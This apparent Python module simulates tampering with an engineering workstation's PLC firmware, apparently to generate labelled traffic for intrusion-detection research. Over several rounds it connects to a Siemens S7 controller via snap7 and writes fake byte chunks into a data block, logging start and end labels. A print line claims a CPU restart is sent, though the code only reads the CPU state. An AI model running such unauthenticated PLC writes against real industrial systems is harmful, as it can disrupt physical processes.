"""
EWS_FIRMWARE_TAMPER
Kỹ thuật: Giả lập quá trình upload firmware/project bất thường
          (Không flash thật - chỉ tạo traffic pattern đặc trưng)
Observable: S7 download sequence đặc biệt, large write burst

Gọi từ bash:
  python -m attacks_ext.ews_firmware_tamper \
      --target 192.168.1.10 --rack 0 --slot 1 --duration 300 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import snap7
import time
from attacks_ext.config_ext import base_parser, write_label


def simulate_firmware_upload(client, rack, slot):
    """Giả lập traffic pattern của firmware upload."""
    print("[*] Giả lập firmware upload traffic pattern...")
    NUM_CHUNKS = 10

    for i in range(NUM_CHUNKS):
        fake_chunk = bytes([i % 256] * 50)
        try:
            offset = i * 10
            client.db_write(1, offset % 100, fake_chunk[:10])
            print(f"  [CHUNK {i+1:02d}/{NUM_CHUNKS}] Write {len(fake_chunk[:10])} bytes @ offset {offset % 100}")
            time.sleep(0.2)
        except Exception as e:
            print(f"  [WARN] Chunk {i+1}: {e}")

    print("[*] Upload hoàn tất - Gửi CPU restart request...")
    state = client.get_cpu_state()
    print(f"  [STATE] CPU state sau upload: {state}")


def run(args):
    label_prefix = "EWS_FIRMWARE_TAMPER"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target}")

    client = snap7.client.Client()

    try:
        client.connect(args.target, args.rack, args.slot)
        print(f"[+] Kết nối PLC thành công")

        num_rounds = min(3, max(1, args.duration // 30))
        for round_num in range(num_rounds):
            print(f"\n[ROUND {round_num+1}/{num_rounds}] Bắt đầu upload burst...")
            simulate_firmware_upload(client, args.rack, args.slot)
            time.sleep(5)

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        if client.get_connected():
            client.disconnect()
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"rounds={num_rounds}")


def main():
    p = base_parser("EWS Firmware Tamper Simulation")
    p.add_argument("--target", default="192.168.1.10")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
